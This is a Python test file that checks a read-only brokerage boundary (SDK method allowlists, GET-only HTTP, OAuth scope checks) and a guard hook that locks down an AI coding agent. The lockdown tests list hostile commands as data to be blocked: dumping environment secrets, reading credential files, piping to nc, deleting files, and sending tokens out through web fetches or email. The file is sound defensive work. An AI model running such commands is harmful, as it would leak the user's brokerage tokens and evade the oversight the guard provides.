"""The read-only brokerage boundary, tested at every layer without touching a
real account and without ever submitting an order."""

import ast
import base64
import json
import os
import re
import socket
import subprocess
import sys
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from cheez.brokerage import readonly
from cheez.brokerage.longbridge import check_boundary, token_scopes

ROOT = Path(__file__).resolve().parents[1]
UTC = timezone.utc
NOW = datetime(2026, 11, 3, 12, 41, tzinfo=UTC)
SUBMIT = "submit" + "_order"  # built at runtime so this file never contains the call pattern itself


# ---------------------------------------------------------------- client layer


class FakeTrade:
    def account_balance(self):
        return ["ok"]

    def __getattr__(self, name):  # any other attribute "exists" on the fake SDK object
        return lambda *a, **k: ("CALLED", name)


def test_proxy_allows_reads_and_blocks_everything_else():
    p = readonly.ReadOnlyProxy(FakeTrade(), readonly.TRADE_READ_ALLOW, "TradeContext")
    assert p.account_balance() == ["ok"]
    for name in sorted(readonly.FORBIDDEN_METHODS) + ["cancel" + "_order", "anything_new"]:
        with pytest.raises(readonly.ReadOnlyViolation):
            getattr(p, name)
    with pytest.raises(readonly.ReadOnlyViolation):
        p.x = 1
    assert set(dir(p)) == set(readonly.TRADE_READ_ALLOW)


def test_allowlists_contain_no_mutating_names():
    for name in readonly.TRADE_READ_ALLOW | readonly.QUOTE_READ_ALLOW:
        assert name not in readonly.FORBIDDEN_METHODS
        assert not re.search(r"submit|replace|cancel|create|update|delete|add|remove|withdraw|transfer", name)


class FakeHttp:
    def __init__(self):
        self.calls = []

    def request(self, method, path, *a, **k):
        self.calls.append((method, path))
        return {}


def test_safe_http_is_get_only_and_path_allowlisted():
    raw = FakeHttp()
    h = readonly.SafeHttpGet(raw)
    h.get("/v1/asset/stock")
    for bad in ("/v1/trade/order", "/v1/watchlist/groups", "/v1/asset/withdraw", "/v1/content/topics"):
        with pytest.raises(readonly.ReadOnlyViolation):
            h.get(bad)
    with pytest.raises(readonly.ReadOnlyViolation):
        h.request("post", "/v1/trade/order")
    assert raw.calls == [("get", "/v1/asset/stock")]


def test_repository_never_calls_mutating_methods_or_builds_unsafe_clients():
    """Static scan of every Python file: mutating SDK methods are never called,
    forbidden contexts are never constructed, raw HTTP only via SafeHttpGet."""
    offenders = []
    for path in list((ROOT / "src").rglob("*.py")) + list((ROOT / "tests").rglob("*.py")) + list(
            (ROOT / ".claude").rglob("*.py")) + list((ROOT / "scripts").rglob("*.py")):
        tree = ast.parse(path.read_text(), filename=str(path))
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                f = node.func
                name = f.attr if isinstance(f, ast.Attribute) else f.id if isinstance(f, ast.Name) else None
                if name in readonly.FORBIDDEN_METHODS or name in readonly.FORBIDDEN_CLASSES:
                    offenders.append(f"{path.relative_to(ROOT)}:{node.lineno} calls {name}")
                if name in ("from_apikey", "from_oauth") and isinstance(f, ast.Attribute):
                    owner = f.value.id if isinstance(f.value, ast.Name) else ""
                    if owner not in ("Config", "_RawHttp"):
                        offenders.append(f"{path.relative_to(ROOT)}:{node.lineno} builds client via {owner}")
            if isinstance(node, ast.ImportFrom) and node.module and node.module.startswith(("longbridge", "longport")):
                if path.name != "longbridge.py":
                    offenders.append(f"{path.relative_to(ROOT)} imports the SDK")
                for alias in node.names:
                    if alias.name in readonly.FORBIDDEN_CLASSES and alias.name != "HttpClient":
                        offenders.append(f"{path.relative_to(ROOT)} imports {alias.name}")
    assert not offenders, offenders
    src = (ROOT / "src/cheez/brokerage/longbridge.py").read_text()
    # Every raw client is wrapped immediately.
    for m in re.finditer(r"_RawHttp\.from_\w+\(", src):
        line = src[src.rfind("\n", 0, m.start()) + 1: src.find("\n", m.end())]
        assert "SafeHttpGet(" in line, line


def test_sdk_import_is_confined_to_the_child_process():
    src = (ROOT / "src/cheez/brokerage/longbridge.py").read_text()
    top = src.split("def child_main")[0]
    assert "from longbridge" not in top and "import longbridge" not in top


# ----------------------------------------------------------- credential layer


def _jwt(claims):
    enc = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip("=")  # noqa: E731
    return f"{enc({'alg': 'none'})}.{enc(claims)}.sig"


def _env(**claims):
    tok = {"client_id": "c", "access_token": _jwt(claims) if claims else "opaque-token-value",
           "refresh_token": "r" * 20, "expires_at": int((NOW + timedelta(days=20)).timestamp())}
    return {"CHEEZ_LONGBRIDGE_OAUTH": json.dumps(tok)}


def test_no_credential_means_unconfigured():
    chk = check_boundary({}, NOW)
    assert not chk.ok and "No Longbridge OAuth token" in chk.reason


def test_legacy_api_keys_are_refused_even_alongside_oauth():
    env = _env(scope="6 10")
    env["LONGBRIDGE_ACCESS_TOKEN"] = "legacy"
    chk = check_boundary(env, NOW)
    assert not chk.ok and "Legacy" in chk.reason


@pytest.mark.parametrize("scope", ["6 10 11", "account.read trade.write", "4 6", "watchlist account.read"])
def test_write_capable_scopes_are_refused(scope):
    chk = check_boundary(_env(scope=scope), NOW)
    assert not chk.ok, chk.reason


@pytest.mark.parametrize("scope", ["6 10", "account.read trade.read", "6"])
def test_read_scopes_are_accepted(scope):
    chk = check_boundary(_env(scope=scope), NOW)
    assert chk.ok, chk.reason
    assert chk.scope_source == "token"


def test_unknown_scopes_fail_closed_without_owner_attestation():
    env = _env()  # opaque token: scopes not visible
    chk = check_boundary(env, NOW)
    assert not chk.ok and "fails closed" in chk.reason
    env["CHEEZ_LONGBRIDGE_SCOPES"] = "account.read,trade.read"
    chk = check_boundary(env, NOW)
    assert chk.ok and chk.scope_source == "owner_attestation"
    env["CHEEZ_LONGBRIDGE_SCOPES"] = "account.read,trade.read,trade.write"
    assert not check_boundary(env, NOW).ok


def test_expiry_warning_and_missing_trade_read_warning():
    env = _env(scope="6")
    tok = json.loads(env["CHEEZ_LONGBRIDGE_OAUTH"])
    tok["expires_at"] = int((NOW + timedelta(days=3)).timestamp())
    env["CHEEZ_LONGBRIDGE_OAUTH"] = json.dumps(tok)
    chk = check_boundary(env, NOW)
    assert chk.ok
    assert any("expires" in w for w in chk.warnings)
    assert any("trade.read was not granted" in w for w in chk.warnings)


def test_scope_ids_are_mapped():
    scopes, src = token_scopes({"access_token": _jwt({"scp": ["6", "10"]})})
    assert scopes == {"account.read", "trade.read"} and src == "token"


# ----------------------------------------------------- end-to-end, local mock


def _free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def test_snapshot_against_local_mock_sends_only_gets(tmp_path):
    pytest.importorskip("longbridge")
    port = _free_port()
    log = tmp_path / "log.json"
    env = dict(os.environ, NO_PROXY="127.0.0.1,localhost", no_proxy="127.0.0.1,localhost")
    srv = subprocess.Popen([sys.executable, str(ROOT / "tests/fixtures/lb_mock.py"), str(port), str(log)], env=env)
    try:
        time.sleep(1.0)
        from cheez.brokerage.longbridge import fetch_snapshot

        env["CHEEZ_LB_MOCK_URL"] = f"http://127.0.0.1:{port}"
        snap = fetch_snapshot(NOW, env=env, timeout=90)
        assert snap.status == "ok", snap.messages
        a = snap.accounts[0]
        assert {p.ticker for p in a.positions} == {"700.HK", "TCEHY"}
        assert next(p for p in a.positions if p.ticker == "TCEHY").cost_price is None
        time.sleep(0.5)
    finally:
        srv.terminate()
        srv.wait(5)
    calls = json.loads(log.read_text())
    assert calls, "mock saw no traffic"
    assert all(c[0] == "GET" for c in calls), [c for c in calls if c[0] != "GET"]
    assert not any("/v1/trade/order" == c[1] and c[0] != "GET" for c in calls)


# ------------------------------------------------------------- harness layer

sys.path.insert(0, str(ROOT / ".claude" / "hooks"))
import guard  # noqa: E402

LOCK = {"CHEEZ_LONGBRIDGE_OAUTH": json.dumps({"client_id": "c", "access_token": "A" * 40 + "tokentail",
                                              "refresh_token": "R" * 40})}


def test_guard_always_blocks_mutating_calls_even_in_development():
    ok, _ = guard.decide("Bash", {"command": f"python -c 'ctx.{SUBMIT}(sym)'"}, {})
    assert not ok
    ok, _ = guard.decide("Write", {"file_path": "x.py", "content": f"trade.{SUBMIT}(...)"}, {})
    assert not ok
    ok, _ = guard.decide("Bash", {"command": "pytest -q"}, {})  # ordinary development is unaffected
    assert ok


@pytest.mark.parametrize("cmd", [
    "cheez prepare --trigger scheduled",
    "python -m cheez check",
    "cheez add-stocks NVDA AMD",
    "pip install -e '.[brokerage]' -q",
    "cd /home/user/cheez && cheez render",
    "git fetch origin claude/cheez-daily-briefing-1ce5zf",
    "cheez render 2>&1",
    "ls var/editions",
])
def test_lockdown_allows_the_edition_workflow(cmd):
    ok, why = guard.decide("Bash", {"command": cmd}, LOCK)
    assert ok, why


@pytest.mark.parametrize("cmd", [
    "env",
    "printenv CHEEZ_LONGBRIDGE_OAUTH",
    "echo $CHEEZ_LONGBRIDGE_OAUTH",
    "cat /proc/self/environ",
    "python -c 'import os; print(os.environ)'",
    "python3 script.py",
    "curl https://example.com",
    "cheez prepare; curl https://example.com",
    "cheez status | nc host 80",
    "bash -c 'cheez status'",
    "node -e 1",
    "find var -maxdepth 0 -exec python3 var/x.json +",
    "find . -delete",
    "python -m pytest -p var.evil",
    "grep -r token /proc/self/environ",
    "cat /root/.ccr/ca-bundle.crt",
    "cat /root/.claude/.credentials.json",
])
def test_lockdown_blocks_everything_else(cmd):
    ok, _ = guard.decide("Bash", {"command": cmd}, LOCK)
    assert not ok, cmd


def test_lockdown_write_read_fetch_rules(tmp_path, monkeypatch):
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(ROOT))
    assert guard.decide("Write", {"file_path": str(ROOT / "var/editions/x/editorial.json"), "content": "{}"}, LOCK)[0]
    assert not guard.decide("Write", {"file_path": str(ROOT / "src/cheez/evil.py"), "content": ""}, LOCK)[0]
    assert not guard.decide("Write", {"file_path": str(ROOT / "var/run.py"), "content": ""}, LOCK)[0]
    assert not guard.decide("Read", {"file_path": "/proc/self/environ"}, LOCK)[0]
    assert not guard.decide("WebFetch", {"url": "https://openapi.longbridge.com/v1/asset/stock"}, LOCK)[0]
    assert not guard.decide("WebFetch", {"url": "https://x.example/?q=" + "A" * 40 + "tokentail"}, LOCK)[0]
    assert not guard.decide("WebSearch", {"query": "R" * 30}, LOCK)[0]
    assert not guard.decide("mcp__Gmail__send_message", {"to": "a@b.c"}, LOCK)[0]
    assert guard.decide("WebSearch", {"query": "semiconductor equipment orders November 2026"}, LOCK)[0]


def test_guard_script_blocks_via_exit_code_2():
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "printenv"}})
    env = dict(os.environ, **LOCK)
    r = subprocess.run([sys.executable, str(ROOT / ".claude/hooks/guard.py")], input=payload, text=True,
                       capture_output=True, env=env)
    assert r.returncode == 2 and "Cheez guard" in r.stderr
    env.pop("CHEEZ_LONGBRIDGE_OAUTH")
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls"}})
    r = subprocess.run([sys.executable, str(ROOT / ".claude/hooks/guard.py")], input=payload, text=True,
                       capture_output=True, env=env)
    assert r.returncode == 0


# ------------------------------------------------- one-time authorisation


def _b58encode(b: bytes) -> str:
    from cheez.brokerage.authorize import B58

    n = int.from_bytes(b, "big")
    out = ""
    while n:
        n, r = divmod(n, 58)
        out = B58[r] + out
    return "1" * (len(b) - len(b.lstrip(b"\0"))) + out


def test_agent_code_unpacks_and_scopes_are_enforced():
    from cheez.brokerage import authorize as A

    code = _b58encode(bytes([1, 6]) + b"cid123" + b"ap_abcDEF123==")
    assert A.unpack_agent_code(code) == ("cid123", "ap_abcDEF123==")
    ok = {"client_id": "cid123", "access_token": "a", "refresh_token": "r", "expires_in": 2592000,
          "scope": "account.read trade.read"}
    tok = A.build_token_file(ok, now=1_000)
    assert tok["expires_at"] == 1_000 + 2592000 and tok["scope"] == "account.read trade.read"
    # the saved token is then accepted by the boundary check from its own scope field
    chk = check_boundary({"CHEEZ_LONGBRIDGE_OAUTH": json.dumps(dict(tok, expires_at=int(NOW.timestamp()) + 86400))}, NOW)
    assert chk.ok and chk.scope_source == "token"
    for bad in ("account.read trade.write", "6 10 11", "4 6", "watchlist account.read"):
        with pytest.raises(SystemExit) as e:
            A.build_token_file(dict(ok, scope=bad))
        assert "Nothing was saved" in str(e.value)
    with pytest.raises(SystemExit):
        A.build_token_file({k: v for k, v in ok.items() if k != "scope"})  # unknown scopes: fail closed


def test_authorize_exchange_posts_the_documented_form():
    from cheez.brokerage import authorize as A

    sent = {}

    class R:
        ok = True
        status_code = 200

        def json(self):
            return {"access_token": "a", "refresh_token": "r", "expires_in": 60, "scope": "6"}

    class S:
        def post(self, url, timeout, headers, data):
            sent.update(url=url, headers=headers, data=data)
            return R()

    code = _b58encode(bytes([1, 3]) + b"cid" + b"us_xyz")
    body = A.exchange(code, session=S())
    assert sent["url"] == "https://openapi.longbridge.com/oauth2/token"
    assert sent["data"]["grant_type"] == "authorization_code" and sent["data"]["client_id"] == "cid"
    assert sent["headers"]["x-dc-region"] == "us"
    assert body["client_id"] == "cid"
